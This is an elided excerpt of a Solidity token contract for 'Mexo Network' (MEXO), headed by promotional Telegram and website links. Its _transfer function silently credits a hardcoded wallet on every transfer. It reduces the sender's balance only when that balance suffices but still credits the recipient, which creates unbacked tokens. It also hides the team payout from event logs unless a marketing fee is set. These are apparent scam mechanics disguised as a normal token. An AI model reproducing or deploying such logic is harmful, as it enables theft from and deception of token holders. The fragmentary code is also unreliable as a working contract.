...
// Submitted for Telegram: https://t.me/mexo_network
// Submitted for Website: hhtps://mexonetwork.site
...
contract  MexoNetwork  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Mexo Network";
    string private _symbol = "MEXO";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x59759908719638C5D5049e1494D866dB999DE9d9] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x59759908719638C5D5049e1494D866dB999DE9d9, _teamtoken);
        }
